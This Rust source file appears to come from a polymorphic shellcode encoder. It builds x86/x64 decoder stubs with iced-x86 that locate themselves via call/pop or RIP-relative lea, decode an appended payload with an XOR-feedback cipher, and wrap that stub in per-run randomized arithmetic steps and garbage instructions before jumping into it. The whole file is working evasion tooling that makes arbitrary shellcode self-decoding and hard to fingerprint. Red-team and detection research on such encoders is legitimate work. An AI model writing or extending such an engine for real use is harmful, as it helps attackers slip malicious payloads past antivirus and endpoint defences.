//! Runtime decoder-stub construction.
//!
//! Two loop-free/self-locating stubs are emitted with `iced-x86`:
//!
//! * The **ADFL decoder** reverses [`crate::cipher::cipher_adfl`]. It walks the
//!   ciphered payload from its last byte to its first, XOR-decoding each byte
//!   and folding the recovered plaintext back into the running key — the exact
//!   inverse of the cipher's feedback.
//! * The **schema decoder** reverses [`crate::cipher::schema_cipher`]. It hides
//!   the (already random-looking) ADFL stub behind a per-run stream of
//!   `XOR/ADD/SUB/ROL/ROR/NOT dword ptr` instructions, then jumps into the
//!   decrypted stub.

use crate::cipher::{Schema, SchemaOp};
use crate::obfuscate::generate_garbage;
use crate::registers::{low32, low64, random_base, random_low, reg32, reg64};
use iced_x86::code_asm::*;
use rand::Rng;

/// Error type used across stub construction.
#[derive(Debug)]
pub enum DecoderError {
    Iced(IcedError),
    /// No suitable low-byte key register was available for the chosen base.
    NoKeyRegister,
}

impl std::fmt::Display for DecoderError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            DecoderError::Iced(e) => write!(f, "assembly error: {e}"),
            DecoderError::NoKeyRegister => write!(f, "no safe key register available"),
        }
    }
}

impl std::error::Error for DecoderError {}

impl From<IcedError> for DecoderError {
    fn from(e: IcedError) -> Self {
        DecoderError::Iced(e)
    }
}

/// Builds the ADFL decoder stub for `ciphered_payload` and returns
/// `stub || ciphered_payload` — directly executable, self-decoding shellcode.
pub fn add_adfl_decoder<R: Rng>(
    rng: &mut R,
    arch: u32,
    seed: u8,
    ciphered_payload: Vec<u8>,
) -> Result<Vec<u8>, DecoderError> {
    let base = random_base(rng, arch);
    let key = random_low(rng, arch, base).ok_or(DecoderError::NoKeyRegister)?;

    let mut stub = if arch == 64 {
        build_adfl_x64(base, key, seed, ciphered_payload.len())?
    } else {
        build_adfl_x86(base, key, seed, ciphered_payload.len())?
    };
    stub.extend_from_slice(&ciphered_payload);
    Ok(stub)
}

/// x64 ADFL stub. Uses a RIP-relative `lea` to locate the payload that follows
/// the stub, then `[base + rcx - 1]` indexing to decode from last byte to first.
fn build_adfl_x64(
    base: usize,
    key: usize,
    seed: u8,
    size: usize,
) -> Result<Vec<u8>, IcedError> {
    let mut a = CodeAssembler::new(64)?;
    let mut data = a.create_label();

    a.mov(low64(key), seed as u32)?;
    a.mov(rcx, size as u64)?;
    a.lea(reg64(base), qword_ptr(data))?;

    let mut decode = a.create_label();
    a.set_label(&mut decode)?;
    a.xor(byte_ptr(reg64(base) + rcx - 1), low64(key))?;
    a.add(low64(key), byte_ptr(reg64(base) + rcx - 1))?;
    a.loop_(decode)?;

    a.set_label(&mut data)?;
    a.zero_bytes()?; // anchor the label at end-of-stub (payload is appended after)

    a.assemble(0)
}

/// x86 ADFL stub. Uses the classic `call/pop` to obtain EIP, then folds the
/// distance to the appended payload into the memory displacement. The
/// displacement depends only on the stub's own length, so it is resolved with a
/// cheap two-pass assemble (the placeholder keeps the same disp8 encoding).
fn build_adfl_x86(
    base: usize,
    key: usize,
    seed: u8,
    size: usize,
) -> Result<Vec<u8>, IcedError> {
    let key_reg = low32(key).expect("32-bit key register must have a low byte");
    let base_reg = reg32(base);

    let build = |disp: i32| -> Result<Vec<u8>, IcedError> {
        let mut a = CodeAssembler::new(32)?;
        let mut getip = a.create_label();
        a.call(getip)?;
        a.set_label(&mut getip)?;
        a.pop(base_reg)?; // base_reg = address of this pop (= getip)
        a.mov(ecx, size as u32)?;
        a.mov(key_reg, seed as u32)?;

        let mut decode = a.create_label();
        a.set_label(&mut decode)?;
        a.xor(byte_ptr(base_reg + ecx + disp), key_reg)?;
        a.add(key_reg, byte_ptr(base_reg + ecx + disp))?;
        a.loop_(decode)?;
        a.assemble(0)
    };

    // getip sits at offset 5 (after `call rel32`); the payload starts at
    // offset = stub length. For ecx in [1, size], we need
    // [base+ecx+disp] == payload_start + (ecx - 1), i.e. disp = stub_len - 6.
    let stub_len = build(0x40)?.len() as i32;
    build(stub_len - 6)
}

/// Emits a schema decrypt step `OP dword ptr [base + off]{, key}`.
macro_rules! schema_step {
    ($a:expr, $arch:expr, $base:expr, $off:expr, $m:ident, $imm:expr) => {
        if $arch == 64 {
            $a.$m(dword_ptr(reg64($base) + $off as i32), $imm)?;
        } else {
            $a.$m(dword_ptr(reg32($base) + $off as i32), $imm)?;
        }
    };
    ($a:expr, $arch:expr, $base:expr, $off:expr, $m:ident) => {
        if $arch == 64 {
            $a.$m(dword_ptr(reg64($base) + $off as i32))?;
        } else {
            $a.$m(dword_ptr(reg32($base) + $off as i32))?;
        }
    };
}

/// Builds the schema decoder around a schema-ciphered `blob`.
///
/// Layout produced (the CALL jumps over the data region):
/// ```text
///   call code
///   <garbage prefix> <ciphered blob> <garbage suffix>   ; data, jumped over
/// code:
///   pop  base                     ; base -> start of garbage prefix
///   (garbage) OP dword[base+off]  ; one decrypt step per schema block
///   ...
///   jmp  base                     ; run the now-decrypted stub
/// ```
/// The decrypt steps target the blob, which begins right after the prefix, so
/// `off` starts at `prefix.len()`. All garbage is value-preserving, so `base`
/// survives until the final jump.
pub fn add_schema_decoder<R: Rng>(
    rng: &mut R,
    arch: u32,
    obfuscation_limit: i32,
    blob: Vec<u8>,
    schema: &Schema,
) -> Result<Vec<u8>, DecoderError> {
    let prefix = generate_garbage(rng, arch, obfuscation_limit)?;
    let suffix = generate_garbage(rng, arch, obfuscation_limit)?;
    let base = random_base(rng, arch);
    let start_off = prefix.len();

    let mut a = CodeAssembler::new(arch)?;
    let mut code = a.create_label();

    a.call(code)?;
    a.db(&prefix)?;
    a.db(&blob)?;
    a.db(&suffix)?;
    a.set_label(&mut code)?;

    if arch == 64 {
        a.pop(reg64(base))?;
    } else {
        a.pop(reg32(base))?;
    }

    let mut off = start_off;
    for op in schema {
        // Value-preserving garbage between steps (keeps `base` intact).
        let garbage = generate_garbage(rng, arch, obfuscation_limit)?;
        a.db(&garbage)?;

        match *op {
            SchemaOp::Xor(k) => schema_step!(a, arch, base, off, xor, k),
            SchemaOp::Add(k) => schema_step!(a, arch, base, off, add, k),
            SchemaOp::Sub(k) => schema_step!(a, arch, base, off, sub, k),
            SchemaOp::Rol(n) => schema_step!(a, arch, base, off, rol, (n & 31) as u32),
            SchemaOp::Ror(n) => schema_step!(a, arch, base, off, ror, (n & 31) as u32),
            SchemaOp::Not => schema_step!(a, arch, base, off, not),
        }
        off += 4;
    }

    if arch == 64 {
        a.jmp(reg64(base))?;
    } else {
        a.jmp(reg32(base))?;
    }

    Ok(a.assemble(0)?)
}
